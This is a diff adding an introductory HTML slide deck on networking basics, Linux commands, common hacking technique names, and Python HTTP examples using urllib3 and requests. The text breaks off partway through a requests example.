@@ -1,0 +1,1513 @@
+<!doctype html>
+<html lang="en">
+
+	<head>
+		<meta charset="utf-8">
+
+		<title>Hack and Networking - by FreezeMan</title>
+
+		<meta name="description" content="Hack and Networking tutorials by FreezeMan">
+		<meta name="author" content="FreezeMan">
+
+		<meta name="apple-mobile-web-app-capable" content="yes">
+		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+		<link rel="stylesheet" href="css/reset.css">
+		<link rel="stylesheet" href="css/reveal.css">
+		<link rel="stylesheet" href="css/theme/league.css" id="theme">
+
+		<!-- Theme used for syntax highlighting of code -->
+		<link rel="stylesheet" href="lib/css/monokai.css">
+
+		<!--[if lt IE 9]>
+		<script src="lib/js/html5shiv.js"></script>
+		<![endif]-->
+	</head>
+
+	<body>
+
+		<div class="reveal">
+
+			<div class="slides">
+				<section>
+					<h1>Networking</h1>
+					<h3>and</h3>
+					<h1>Hack</h1>
+					<p>
+						<small>Created by <a href="">Farzad Latifnia</a> (@FreezeMan)</small>
+					</p>
+					<p>
+						Jan 2021
+					</p>
+				</section>
+				<section>
+					<section>
+						<h2>What is Networking?</h2>
+						<p style="text-align: justify;">Computer Networking aims to study and analyze the communication process among various computing devices or computer systems that are linked, or networked together to exchange information and share resources</p>
+						<ul>
+							<li><span class="GoldenYellow">LAN</span> (Local Area Network)</li>
+							<li><span class="GoldenYellow">WAN</span> (Wide Area Network)</li>
+							<li><span class="GoldenYellow">MAN</span> (Metropolitan Area Network)</li>
+							<li><span class="GoldenYellow">PAN</span>(Personal Area Network)</li>
+						</ul>
+					</section>
+					<section>
+						<h3>The OSI(Open System Interconnection) Model</h3>
+						<ul>
+							<li>Physical Layer</li>
+							<li>Datalink Layer</li>
+							<li>Network Layer</li>
+							<li>Transport Layer</li>
+							<li>Session Layer</li>
+							<li>Presentation Layer</li>
+							<li>Application Layer</li>
+						</ul>
+					</section>
+					<section>
+						<h2>The TCP/IP Model</h2>
+						<h5><span class="CornflowerBlue">Transmission Control Protocol</span> / <span class="CornflowerBlue">Internet Protocol</span></h5>
+						<ul>
+							<li>Host-to-network(Network Access) Layer</li>
+							<li>Internet(Network) Layer</li>
+							<li>Transport Layer</li>
+							<li>Application Layer</li>
+						</ul>
+						<p style="text-align: justify;font-size:30px" class="GoldenYellow">ARPA(Advanced Research Projects Agency) known as ARPANET, ARPA's name was changed to Defense Advanced Research Projects Agency (DARPA) in 1971, some people refer to ARPANET as DARPANET. (DARPA was changed back to ARPA in 1993 and back to DARPA again in 1996.)</p>
+					</section>
+					<!--
+						OSI(Open System Interconnection)
+						1. OSI is a generic, protocol independent standard, acting as a communication gateway between the network and end user.
+						2. In OSI model the transport layer guarantees the delivery of packets.
+						3. Follows vertical approach.
+						4. OSI model has a separate Presentation layer and Session layer.
+						5. Transport Layer is Connection Oriented.
+						6. Network Layer is both Connection Oriented and Connection less.
+						7. OSI is a reference model around which the networks are built. Generally it is used as a guidance tool.
+						8. Network layer of OSI model provides both connection oriented and connectionless service.
+						9. OSI model has a problem of fitting the protocols into the model.
+						10. Protocols are hidden in OSI model and are easily replaced as the technology changes.
+						11. OSI model defines services, interfaces and protocols very clearly and makes clear distinction between them. It is protocol independent.
+						12. It has 7 layers
+
+						TCP/IP(Transmission Control Protocol / Internet Protocol)
+						1. TCP/IP model is based on standard protocols around which the Internet has developed. It is a communication protocol, which allows connection of hosts over a network.					
+						2. In TCP/IP model the transport layer does not guarantees delivery of packets. Still the TCP/IP model is more reliable.
+						3. Follows horizontal approach.
+						4. TCP/IP does not have a separate Presentation layer or Session layer.
+						5. Transport Layer is both Connection Oriented and Connection less.
+						6. Network Layer is Connection less.
+						7. TCP/IP model is, in a way implementation of the OSI model.
+						8. The Network layer in TCP/IP model provides connectionless service.
+						9. TCP/IP model does not fit any protocol
+						10. In TCP/IP replacing protocol is not easy.
+						11. In TCP/IP, services, interfaces and protocols are not clearly separated. It is also protocol dependent.
+						12. It has 4 layers
+
+					-->
+					<section>
+						<h2>Transmission Control Protocol<span class="CornflowerBlue">(TCP)</span></h2>
+						<p style="text-align: justify;font-size:30px" class="GoldenYellow">In TCP there is a concept of handshake. So, What is a handshake? It's a way to ensure that the connection has been established between interested hosts and therefore data transfer can be initiated.</p>
+						<ul>
+							<li>Reliable</li>
+							<li>Ordered</li>
+							<li>Heavyweight</li>
+						</ul>
+					</section>
+					<section>
+						<h2>User Datagram Protocol<span class="CornflowerBlue">(UDP)</span></h2>
+						<p style="text-align: justify;font-size:30px" class="GoldenYellow">UDP is a connectionless protocol. In this protocol data is sent over the internet as datagrams.</p>
+						<ul>
+							<li>Unreliable</li>
+							<li>Not ordered</li>
+							<li>Lightweight</li>
+							<li>Datagrams</li>
+						</ul>
+					</section>
+					<section>
+						<h2>IP Addresses and Ports</h2>
+						<p style="text-align: justify;font-size:30px"><span class="CornflowerBlue">IP addresses</span> are the addresses which helps to uniquely identify a device over the internet and <span class="CornflowerBlue">Port</span> is an endpoint for the communication in an operating system</p>
+						<p style="text-align: justify;font-size:30px;display: list-item;" class="GoldenYellow">A system might be running thousands of services but to uniquely identify a service on a system the application requires a port number</p>
+						<p style="text-align: justify;font-size:30px;display: list-item;" class="GoldenYellow">There are total of <span class="CornflowerBlue">0</span> – <span class="CornflowerBlue">65535</span> ports on a system</p>
+					</section>					
+					<section>
+						<h2>IP Address</h2>
+						<p><span class="RedOrange">Static</span>, <span class="RedOrange">Dynamic</span></p>
+						<p>IP address is of two types:</p>
+						<ol>
+							<li style="text-align: justify;font-size:30px;padding-bottom:15px"><span class="GoldenYellow">Private IP address</span>: Ranges from (<span class="CornflowerBlue">192.168.0.0</span> – <span class="CornflowerBlue">192.168.255.255</span>), (<span class="CornflowerBlue">172.16.0.0</span> – <span class="CornflowerBlue">172.31.255.255</span>) or (<span class="CornflowerBlue">10.0.0.0</span> - <span class="CornflowerBlue">10.255.255.255</span>)</li>
+							<li style="text-align: justify;font-size:30px"><span class="GoldenYellow">Public IP address</span>: A public IP address is an IP address that your home or business router receives from your <span class="CornflowerBlue">ISP</span>(Internet Service Provider).</li>
+						</ol>
+						<p style="text-align: justify;font-size:30px"><span class="CornflowerBlue">0.0.0.0</span> – <span class="CornflowerBlue">0.255.255.255</span> (Current network)</p>
+						<p style="text-align: justify;font-size:30px"><span class="CornflowerBlue">127.0.0.0</span> – <span class="CornflowerBlue">127.255.255.255</span>(for loopback addresses to the localhost)</p>
+					</section>
+					<section>
+						<h2>Ports</h2>
+						<p style="text-align: justify;font-size:35px"><span class="GoldenYellow">Official</span>: Port is registered with IANA for the application</p>
+						<p style="text-align: justify;font-size:35px"><span class="GoldenYellow">Unofficial</span>: Port is not registered with IANA for the application</p>
+						<p style="text-align: justify;font-size:35px"><span class="GoldenYellow">Multiple use</span>: Multiple applications are known to use this port.</p>
+					</section>
+					<section>
+						<h2>common network ports you should know</h2>
+						<p><span class="CornflowerBlue">Part 1</span></p>
+						<ul>
+							<li style="text-align: justify;font-size:30px"><span class="GoldenYellow">20</span>: File Transfer Protocol (FTP) Data Transfer</li>
+							<li style="text-align: justify;font-size:30px"><span class="GoldenYellow">21</span>: File Transfer Protocol (FTP) Command Control</li>
+							<li style="text-align: justify;font-size:30px"><span class="GoldenYellow">22</span>: Secure Shell (SSH)</li>
+							<li style="text-align: justify;font-size:30px"><span class="GoldenYellow">23</span>: Telnet - Remote login service, unencrypted text messages</li>
+							<li style="text-align: justify;font-size:30px"><span class="GoldenYellow">25</span>: Simple Mail Transfer Protocol (SMTP) E-mail Routing</li>
+							<li style="text-align: justify;font-size:30px"><span class="GoldenYellow">53</span>: Domain Name System (DNS) service</li>
+							<li style="text-align: justify;font-size:30px"><span class="GoldenYellow">80</span>: Hypertext Transfer Protocol (HTTP) used in World Wide Web</li>
+						</ul>
+					</section>
+					<section>
+						<h2>common network ports you should know</h2>
+						<p><span class="CornflowerBlue">Part 2</span></p>
+						<ul>
+							<li style="text-align: justify;font-size:30px"><span class="GoldenYellow">110</span>: Post Office Protocol (POP3) used by e-mail clients to retrieve e-mail from a server</li>
+							<li style="text-align: justify;font-size:30px"><span class="GoldenYellow">119</span>: Network News Transfer Protocol (NNTP)</li>
+							<li style="text-align: justify;font-size:30px"><span class="GoldenYellow">123</span>: Network Time Protocol (NTP)</li>
+							<li style="text-align: justify;font-size:30px"><span class="GoldenYellow">143</span>: Internet Message Access Protocol (IMAP) Management of Digital Mail</li>
+							<li style="text-align: justify;font-size:30px"><span class="GoldenYellow">161</span>: Simple Network Management Protocol (SNMP)</li>
+							<li style="text-align: justify;font-size:30px"><span class="GoldenYellow">194</span>: Internet Relay Chat (IRC)</li>
+							<li style="text-align: justify;font-size:30px"><span class="GoldenYellow">443</span>: HTTP Secure (HTTPS) HTTP over TLS/SSL</li>
+						</ul>
+					</section>
+					<section>
+						<h2>Firewall</h2>
+						<p style="text-align: justify;font-size:30px">The firewall monitors the incoming and outgoing network traffic based on predefined security rules like scanning digital signature, checking for valid file formats etc.</p>
+						<ul>
+							<li style="text-align: justify;font-size:30px;padding-bottom:15px"><span class="GoldenYellow">firewalld</span>: On Fedora, CentOS, Red Hat, and similar distributions, the firewall software installed by default.</li>
+							<li style="text-align: justify;font-size:30px;padding-bottom:15px"><span class="GoldenYellow">UFW</span>: On Debian and Ubuntu for managing the iptables firewall easily. A Graphical user interface of ufw, GUFW is also available for Ubuntu and Debian users.</li>
+							<li style="text-align: justify;font-size:30px"><span class="GoldenYellow">Iptables/Netfilter</span>: installed by default on all official Ubuntu distributions (Ubuntu, Kubuntu, Xubuntu) and almost always comes pre-installed on any Linux distribution.</li>
+						</ul>
+					</section>
+					<section>
+						<h2>Firewall</h2>
+						<ul>
+							<li style="text-align: justify;font-size:30px;padding-bottom:15px"><span class="GoldenYellow">IPCop</span>: provides a well designed web interface to manage the firewall. It’s very useful and good for Small businesses and Local PCs.Its Color coded Web Interface allows you to Monitor the performance Graphics for CPU, Memory and Disk as well as Network throughput.</li>
+							<li style="text-align: justify;font-size:30px;padding-bottom:15px"><span class="GoldenYellow">Shorewall</span>: GUI interface with Webmin control Panel. Multiple ISP support. Centralized firewall Administration. Supports a wide range of routers/firewall/gateway applications.</li>
+							<li style="text-align: justify;font-size:30px"><span class="GoldenYellow">Vuurmuur</span>: On Debian and Ubuntu for managing the iptables firewall easily. A Graphical user interface of ufw, GUFW is also available for Ubuntu and Debian users.</li>
+						</ul>
+					</section>
+					<section>
+						<h2>Firewall</h2>
+						<ul>
+							<li style="text-align: justify;font-size:30px;padding-bottom:15px"><span class="GoldenYellow">pfSense</span>: a very reliable firewall for FreeBSD servers. Can be deployed as a perimeter firewall, router, DHCP & DNS server. Highly configurable and upgraded from its Web – based interface. Configured as wireless access point and a VPN endpoint. Traffic shaping and Real Time information about the server. Inbound and Outbound load balancing.</li>
+							<li style="text-align: justify;font-size:30px"><span class="GoldenYellow">IPFire</span>: open source Linux based firewalls for Small Office , Home Office (SOHO) environments. Its designed with modularity and highly flexibility. Can be deployed as a firewall, a proxy server or a VPN gateway. Content filtering. Inbuilt Intrusion detection system. Support hypervisors like KVM, VmWare and Xen for Virtualization environment.</li>
+						</ul>
+					</section>
+					<section>
+						<h2>Firewall</h2>
+						<ul>
+							<li style="text-align: justify;font-size:30px;padding-bottom:15px"><span class="GoldenYellow">SmoothWall</span>: Linux firewall with a highly configurable Web based interface. Its Web based interface is know as WAM (Web Access manager). Supports LAN, DMZ, and Wireless networks, plus External.</li>
+							<li style="text-align: justify;font-size:30px"><span class="GoldenYellow">Endian</span>: Endian firewall is another Stateful packet Inspection concept based firewall which can be deployed as routers, proxy and Gateway VPN with OpenVPN. Its originally developed from IPCop firewall which is also a fork of Smoothwall. Can secure web server with HTTP & FTP proxies, antivirus and URL blacklist. Can secure Mail servers with SMTP and POP3 proxies, Spam Auto-learning, Greylisting. VPN with IPSec. Real time Network traffic logging.</li>
+						</ul>
+					</section>
+					<section>
+						<h2>Firewall</h2>
+						<ul>
+							<li style="text-align: justify;font-size:30px;padding-bottom:15px"><span class="GoldenYellow">ConfigServer Security Firewall(CSF)</span>: Configserver security & firewall, It’s a cross platform and a very versatile Firewall, it’s also based on the concept of Stateful packet inspection (SPI) Firewall. It supports almost all Virtualization environments like Virtuozzo, OpenVZ, VMware, XEN, KVM and Virtualbox. Can be easily integrated popular web hosting control panels like cPanel, DirectAdmin and Webmin. Its daemon process LFD( Login failure daemon) checks for login failures of sensitive servers like ssh, SMTP, Exim, Imap, Pure & ProFTP, vsftpd, Suhosin and mod_security failures.</li>
+							<li style="text-align: justify;font-size:30px"><span class="GoldenYellow">Windows Firewall(Netsh command)</span>: windows firewall manager :)</li>
+						</ul>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Linux/Unix OS</h2>
+						<p>Best of Distro for Developer</p>
+						<ul>
+							<li><small>Arch(Linux kernel)</small></li>
+							<li><small>Debian(Linux kernel)</small></li>
+							<li><small>Solus(Linux kernel)</small></li>
+							<li><small>Manjaro(Arch)</small></li>
+							<li><small>Puppy Linux(Ubuntu and Slackware)</small></li>
+							<li><small>Pop!_OS(Debian and Ubuntu)</small></li>
+							<li><small>Ubuntu(Debian)</small></li>
+							<li><small>Sabayon Linux(Gentoo)</small></li>
+							<li><small>CentOS Stream(RedHat)</small></li>
+							<li><small>Fedora Workstation(RedHat)</small></li>
+							<li><small>openSUSE(Slackware)</small></li>
+							<li><small>Raspberry Pi OS(Debian)</small></li>
+						</ul>
+					</section>
+
+					<section>
+						<h2>Linux/Unix OS</h2>
+						<p>Best of Distro for Hackers</p>
+						<ul>
+							<li><small>Kali Linux(Debian)</small></li>
+							<li><small>BlackArch(Arch)</small></li>
+							<li><small>BackBox(Ubuntu)</small></li>
+							<li><small>Parrot Security OS(Debian)</small></li>
+							<li><small>Bugtraq(Linux kernel)</small></li>
+							<li><small>DEFT Linux(Linux and DART)</small></li>
+							<li><small>Samurai Web Testing Framework(Ubuntu)</small></li>
+							<li><small>Pentoo Linux(Gentoo)</small></li>
+							<li><small>CAINE(Ubuntu)</small></li>
+							<li><small>Network Security Toolkit(Fedora)</small></li>
+							<li><small>Fedora Security Spin(Fedora)</small></li>
+							<li><small>ArchStrike or ArchAssault(Arch)</small></li>
+						</ul>
+					</section>
+
+					<section>
+						<h2>Useful Commands</h2>
+						<p>some commands for hacker</p>
+						<ul>
+							<li style="text-align: justify;font-size:30px;padding-bottom:15px"><span class="GoldenYellow">du</span>(Disk usage)<small>The du command is a standard Linux/Unix command that allows a user to gain disk usage information quickly</small></li>
+							<li style="text-align: justify;font-size:30px;padding-bottom:15px"><span class="GoldenYellow">ps</span>(processes status)<small>is a native Unix/Linux utility for viewing information concerning a selection of running processes on a system: it reads this information from the virtual files in /proc filesystem</small></li>
+							<li style="text-align: justify;font-size:30px;padding-bottom:15px"><span class="GoldenYellow">netstat</span>(Network statistics)<small>is a command line utility that can be used to list out all the network (socket) connections on a system. It lists out all the tcp, udp socket connections and the unix socket connections.</small></li>
+							<li style="text-align: justify;font-size:30px;padding-bottom:15px"><span class="GoldenYellow">kill</span><small>kill command in Linux (located in /bin/kill), is a built-in command which is used to terminate processes manually. kill command sends a signal to a process which terminates the process</small></li>
+							<li style="text-align: justify;font-size:30px;padding-bottom:15px"><span class="GoldenYellow">scp</span>(secure copy)<small>is used to copy file(s) between servers in a secure way. The SCP command or secure copy allows secure transferring of files in between the local host and the remote host or between two remote hosts.</small></li>
+						</ul>
+					</section>
+
+					<section>
+						<h2>Useful Commands</h2>
+						<p>some commands for hacker</p>
+						<ul>
+							<li style="text-align: justify;font-size:30px;padding-bottom:15px"><span class="GoldenYellow">ssh</span>(secure shell)<small>is a network protocol that enables secure remote connections between two systems.</small></li>
+							<li style="text-align: justify;font-size:30px;padding-bottom:15px"><span class="GoldenYellow">cp</span>(copy)<small>This command is used to copy files or group of files or directory.</small></li>
+							<li style="text-align: justify;font-size:30px;padding-bottom:15px"><span class="GoldenYellow">rm</span>(remove)<small>is used to remove objects such as files, directories, symbolic links and so on from the file system like UNIX.</small></li>
+							<li style="text-align: justify;font-size:30px;padding-bottom:15px"><span class="GoldenYellow">mv</span>(move)<small>is a Unix command that moves one or more files or directories from one place to another.</small></li>
+							<li style="text-align: justify;font-size:30px;padding-bottom:15px"><span class="GoldenYellow">ls</span>(list)<small> is a command to list computer files in Unix and Unix-like operating systems.</small></li>
+							
+						</ul>
+					</section>
+
+					<section>
+						<h2>Useful Commands</h2>
+						<p>some commands for hacker</p>
+						<ul>
+							<li style="text-align: justify;font-size:30px;padding-bottom:15px"><span class="GoldenYellow">chmod</span><small>This command can be used to change the general permissions of a file or directory.</small></li>
+							<li style="text-align: justify;font-size:30px;padding-bottom:15px"><span class="GoldenYellow">chown</span>(change owner)<small>This command can be used to change the ownership of files and directories from one user to another.</small></li>
+							<li style="text-align: justify;font-size:30px;padding-bottom:15px"><span class="GoldenYellow">useradd</span><small>Creates a home directory for the user(create user)</small></li>
+							<li style="text-align: justify;font-size:30px;padding-bottom:15px"><span class="GoldenYellow">passwd</span><small>This will prompt you to enter a password or change password.</small></li>
+							<li style="text-align: justify;font-size:30px;padding-bottom:15px"><span class="GoldenYellow">pwd</span><small>This command shows you where you are currently working from within the system.</small></li>
+							<li style="text-align: justify;font-size:30px;padding-bottom:15px"><span class="GoldenYellow">whereis</span><small>This command can be used to locate installed binaries within the system.</small></li>
+						</ul>
+					</section>
+
+					<section>
+						<h2>Useful Commands</h2>
+						<p>some commands for hacker</p>
+						<ul>
+							<li style="text-align: justify;font-size:30px;padding-bottom:15px"><span class="GoldenYellow">locate</span><small>This command is used to find files within the system.</small></li>
+							<li style="text-align: justify;font-size:30px;padding-bottom:15px"><span class="GoldenYellow">find</span><small>This command allows you to find files within the system in a more granular manner.</small></li>
+							<li style="text-align: justify;font-size:30px;padding-bottom:15px"><span class="GoldenYellow">cat</span><small>This command outputs the contents of a file. It can also be used to feed the contents of a file into another file by combining it with the > operator.</small></li>
+							<li style="text-align: justify;font-size:30px;padding-bottom:15px"><span class="GoldenYellow">ifconfig</span><small>These commands can be used to bring up or take down the network interfaces — ifconfig for the Ethernet interface and iwconfig for the wireless interface.</small></li>
+							<li style="text-align: justify;font-size:30px;padding-bottom:15px"><span class="GoldenYellow">tcpdump</span><small>This command can be used to analyze network traffic for various purposes and to capture network traffic into a file that can later on be thoroughly analyzed for specific traffic.</small></li>
+						</ul>
+					</section>
+
+					<section>
+						<h2>Useful Commands</h2>
+						<p>some commands for hacker</p>
+						<ul>
+							<li style="text-align: justify;font-size:30px;padding-bottom:15px"><span class="GoldenYellow">traceroute</span><small>traceroute and tracert are computer network diagnostic commands for displaying possible routes and measuring transit delays of packets across an Internet Protocol network.</small></li>
+							<li style="text-align: justify;font-size:30px;padding-bottom:15px"><span class="GoldenYellow">netcat</span><small>is a computer networking utility for reading from and writing to network connections using TCP or UDP. The command is designed to be a dependable back-end that can be used directly or easily driven by other programs and scripts.</small></li>
+						</ul>
+					</section>
+				</section>
+
+				<section>
+					<section>
+						<h2>Who is Hacker?</h2>
+						<p>A computer <span class="GoldenYellow">hacker</span> is a computer expert who uses their technical <span class="CornflowerBlue">knowledge</span> to achieve a goal (malicious or intentional) or overcome an obstacle, within a computerized system by <span class="GoldenYellow">non-standard</span> means. someone who utilizes their technical know-how of <span class="GoldenYellow">bugs</span> or <span class="GoldenYellow">exploits</span> to break into computer systems and access data.</p>
+					</section>
+
+					<section>
+						<h2>Types of Hacker</h2>
+						<ul>
+							<li>White hat hacker</li>
+							<li><span class="">Black hat hacker</span></li>
+							<li><span class="">Grey hat hacker</span></li>
+						</ul>
+					</section>
+
+					<section>
+						<h2>Common Hacking Techniques</h2>
+						<ul>
+							<li style="font-size:30px">Bait and Switch</li>
+							<li style="font-size:30px">Cookie Theft with XSS</li>
+							<li style="font-size:30px">Denial of Service/Distributed Denial of Service (DoS/DDoS)</li>
+							<li style="font-size:30px">Eavesdropping(Passive Attacks)</li>
+							<li style="font-size:30px">Keylogging</li>
+							<li style="font-size:30px">Malware</li>
+							<li style="font-size:30px">ClickJacking Attacks</li>
+							<li style="font-size:30px">Brute Force Attack</li>
+							<li style="font-size:30px">Keylogging</li>
+							<li style="font-size:30px">Malware and Viruses and Trojans</li>
+							<li style="font-size:30px">Phishing and Related Phenomena</li>
+							<li style="font-size:30px">Watering Hole and WAP Attacks(Fake W.A.P.)</li>
+							<li style="font-size:30px">Man in the Middle” (or “MITM”) Attack</li>
+						</ul>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>HTTP response status codes</h2>
+							<ul>
+								<li class="fragment fade-in-then-semi-out">Informational responses (100–199)</li>
+								<li class="fragment fade-in-then-semi-out">Successful responses (200–299)</li>
+								<li class="fragment fade-in-then-semi-out">Redirects (300–399)</li>
+								<li class="fragment fade-in-then-semi-out">Client errors (400–499)</li>
+								<li class="fragment fade-in-then-semi-out">Server errors (500–599)</li>
+							</ul>
+					</section>
+					<section>
+						<h2>Python Internet modules</h2>
+						<p>A list of some important modules in Python Network/Internet programming</p>
+						<table class="" style="text-align:center;font-size:26px;">
+							<tbody>
+								<tr>
+									<th style="text-align:center;width:10%" class="GoldenYellow">Protocol</th>
+									<th style="text-align:center;width:30%" class="GoldenYellow">Common function</th>
+									<th style="text-align:center;width:15%" class="GoldenYellow">Port No</th>
+									<th class="GoldenYellow">Python module</th>
+								</tr>
+								<tr>
+									<td>HTTP</td>
+									<td>Web pages</td>
+									<td>80</td>
+									<td>httplib, urllib, xmlrpclib</td>
+								</tr>
+								<tr>
+									<td>NNTP</td>
+									<td>Usenet news</td>
+									<td>119</td>
+									<td>nntplib</td>
+								</tr>
+								<tr>
+									<td>FTP</td>
+									<td>File transfers</td>
+									<td>20</td>
+									<td>ftplib, urllib</td>
+								</tr>
+								<tr>
+									<td>SMTP</td>
+									<td>Sending email</td>
+									<td>25</td>
+									<td>smtplib</td>
+								</tr>
+								<tr>
+									<td>POP3</td>
+									<td>Fetching email</td>
+									<td>110</td>
+									<td>poplib</td>
+								</tr>
+								<tr>
+									<td>IMAP4</td>
+									<td>Fetching email</td>
+									<td>143</td>
+									<td>imaplib</td>
+								</tr>
+								<tr>
+									<td>Telnet</td>
+									<td>Command lines</td>
+									<td>23</td>
+									<td>telnetlib</td>
+								</tr>
+								<tr>
+									<td>Gopher</td>
+									<td>Document transfers</td>
+									<td>70</td>
+									<td>gopherlib, urllib</td>
+								</tr>
+							</tbody>
+						</table>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Python modules</h2>
+						<ul>
+							<li class="fragment fade-in-then-semi-out">urllib(urllib2, urllib3)</li>
+							<li class="fragment fade-in-then-semi-out">request</li>
+							<li class="fragment fade-in-then-semi-out">socket</li>
+							<li class="fragment fade-in-then-semi-out">scapy</li>
+							<li class="fragment fade-in-then-semi-out">python-nmap</li>
+							<li class="fragment fade-in-then-semi-out">selenium</li>
+							<li class="fragment fade-in-then-semi-out">beautifulsoup</li>
+						</ul>
+					</section>
+				</section>
+
+				<section>
+				
+					<section>
+						<h2>urllib(v.3)</h2>
+						<p><small>The urllib3 module is a powerful, sanity-friendly HTTP client for Python. It supports thread safety, connection pooling, client-side SSL/TLS verification, file uploads with multipart encoding, helpers for retrying requests and dealing with HTTP redirects, gzip and deflate encoding, and proxy for HTTP and SOCKS.</small></p>
+						<p><small><span class="GoldenYellow">pip3 install urllib3</span></small></p>
+						<pre><code class="hljs python">
+#!/usr/bin/env python3
+import urllib3
+
+print(urllib3.__version__)
+#'1.26.3'
+
+http = urllib3.PoolManager() # generate a request
+url = 'http://freezeman.com'
+
+resp = http.request('GET', url) # send the request
+
+print(resp.data.decode('utf-8')) 
+print(resp.status) # the status code of the response
+
+resp = http.request('HEAD', url) # request is a GET request without a message body
+
+print(resp.headers['Server'])
+print(resp.headers['Date'])
+print(resp.headers['Content-Type'])
+print(resp.headers['Last-Modified'])
+						</code></pre>
+					</section>
+					
+					<section>
+						<h2>Python urllib3 HTTPS request</h2>
+						<p><small>The urllib3 provides client-side TLS/SSL verification.For this, we need to download the certifi module.</small></p>
+						<p><small><span class="GoldenYellow">pip install certifi</span></small></p>
+						<pre><code class="hljs python">
+#!/usr/bin/env python3
+
+import urllib3
+import certifi
+
+
+url = 'https://httpbin.org/anything'
+
+http = urllib3.PoolManager(ca_certs=certifi.where())
+resp = http.request('GET', url)
+
+print(resp.status)		</code></pre>
+					</section>
+					
+					<section>
+						<h2>Python urllib3 query parameters</h2>
+						<p>for Get Request</p>
+						<pre><code class="hljs python">
+#!/usr/bin/env python3
+
+import urllib3
+import certifi
+
+http = urllib3.PoolManager(ca_certs=certifi.where())
+
+payload = {'name': 'Peter', 'age': 23}
+
+url = 'https://httpbin.org/get'
+req = http.request('GET', url, fields=payload)
+
+print(req.data.decode('utf-8'))
+
+"""
+{
+  "args": {
+    "age": "23",
+    "name": "Peter"
+  },
+  "headers": {
+    "Accept-Encoding": "identity",
+    "Host": "httpbin.org",
+    "X-Amzn-Trace-Id": "Root=1-5e4ea45f-c3c9c721c848f8f81a3129d8"
+  },
+  "origin": "188.167.251.9",
+  "url": "https://httpbin.org/get?name=Peter&age=23"
+}
+"""						</code></pre>
+					</section>
+					
+					<section>
+						<h2>Python urllib3 query parameters</h2>
+						<p>for Post Request</p>
+						<pre><code class="hljs python">
+#!/usr/bin/env python3
+
+import urllib3
+import certifi
+
+
+http = urllib3.PoolManager(ca_certs=certifi.where())
+
+url = 'https://httpbin.org/post'
+
+req = http.request('POST', url, fields={'name': 'John Doe'})
+print(req.data.decode('utf-8'))
+
+"""
+{
+  "args": {},
+  "data": "",
+  "files": {},
+  "form": {
+    "name": "John Doe"
+  },
+  ...
+  "url": "https://httpbin.org/post"
+}
+"""						</code></pre>
+					</section>
+					
+					<section>
+						<h2>Python urllib3 send JSON</h2>
+						<p><small>In requests, such as POST or PUT, the client tells the server what type of data is actually sent with the Content-Type header.</small></p>
+						<pre><code class="hljs python">
+#!/usr/bin/env python3
+
+import urllib3
+import certifi
+import json
+
+
+http = urllib3.PoolManager(ca_certs=certifi.where())
+
+payload = {'name': 'John Doe'}
+encoded_data = json.dumps(payload).encode('utf-8')
+
+resp = http.request(
+     'POST',
+     'https://httpbin.org/post',
+     body=encoded_data,
+     headers={'Content-Type': 'application/json'})
+
+data = json.loads(resp.data.decode('utf-8'))['json']
+print(data)
+
+"""
+{'name': 'John Doe'}
+"""						</code></pre>
+					</section>
+					
+					<section>
+						<h2>Python urllib3 binary data</h2>
+						<p><small>In the following example, we download binary data.</small></p>
+						<pre><code class="hljs python">
+#!/usr/bin/env python3
+
+import urllib3
+
+
+http = urllib3.PoolManager()
+
+url = 'http://webcode.me/favicon.ico'
+req = http.request('GET', url)
+
+with open('favicon.ico', 'wb') as f:
+    f.write(req.data)
+						</code></pre>
+					</section>
+					
+					<section>
+						<h2>Python urllib3 stream data</h2>
+						<p><small> Chunked transfer encoding is a streaming data transfer mechanism available since HTTP 1.1. In chunked transfer encoding, the data stream is divided into a series of non-overlapping chunks. The chunks are sent out and received independently of one another. Each chunk is preceded by its size in bytes. </small></p>
+						<pre><code class="hljs python">
+#!/usr/bin/env python3
+
+import urllib3
+import certifi
+
+
+url = "https://docs.oracle.com/javase/specs/jls/se8/jls8.pdf"
+
+local_filename = url.split('/')[-1]
+
+http = urllib3.PoolManager(ca_certs=certifi.where())
+
+resp = http.request(
+    'GET',
+    url,
+    preload_content=False)
+
+with open(local_filename, 'wb') as f:
+
+    for chunk in resp.stream(1024):
+        f.write(chunk)
+
+resp.release_conn()
+						</code></pre>
+					</section>
+					
+					<section>
+						<h2>Python urllib3 redirect</h2>
+						<p><small> A redirect sends users and search engines to a different URL from the one they originally requested. To follow redirects, we set the <span class="GoldenYellow">redirect</span> option to <span class="CornflowerBlue">True</span>.</small></p>
+						<pre><code class="hljs python">
+#!/usr/bin/env python3
+
+import urllib3
+import certifi
+
+http = urllib3.PoolManager(ca_certs=certifi.where())
+
+
+url = 'https://httpbin.org/redirect-to?url=/'
+resp = http.request('GET', url, redirect=True)
+
+print(resp.status)
+print(resp.geturl())
+print(resp.info())
+
+"""
+200
+/
+HTTPHeaderDict({'Date': 'Fri, 21 Feb 2020 12:49:29 GMT', 'Content-Type': 'text/html; 
+charset=utf-8', 'Content-Length': '9593', 'Connection': 'keep-alive', 
+'Server': 'gunicorn/19.9.0', 'Access-Control-Allow-Origin': '*', 
+'Access-Control-Allow-Credentials': 'true'})
+"""
+						</code></pre>
+					</section>
+					
+				</section>
+				
+				<section>
+					<section>
+						<h2>Requests Module With Python</h2>
+						<p><small>Requests is a Python module that you can use to send all kinds of HTTP requests. It is an easy-to-use library with a lot of features ranging from passing parameters in URLs to sending custom headers and SSL Verification. In this tutorial, you will learn how to use this library to send simple HTTP requests in Python.</small></p>
+						<p><small><span class="GoldenYellow">pip3 install requests</span></small></p>
+						<pre><code class="hljs python">
+#!/usr/bin/env python3
+
+import requests
+
+# r = requests.put('https://httpbin.org/put', data = {'key':'value'})
+# r = requests.post('https://httpbin.org/post', data = {'key':'value'})
+# r = requests.get('https://httpbin.org/get')
+# r = requests.delete('https://httpbin.org/delete')
+# r = requests.head('https://httpbin.org/get')
+# r = requests.options('https://httpbin.org/get')
+
+req = requests.get('http://www.edureka.co/')
+ 
+print(req.encoding,  # returns 'utf-8'
+      req.status_code,  # returns 200
+      req.elapsed,  # returns datetime.timedelta(0, 1, 666890)
+      req.url,  # returns 'c'
+      req.history, # track redirection
+	  # req.content,
+      req.headers['Content-Type'] # returns 'text/html; charset=utf-8',
+	  sep="\n")
+
+
+
+"""
+UTF-8
+200
+0:00:01.077320
+https://www.edureka.co:443/
+[&lt;Response [301]&gt;]
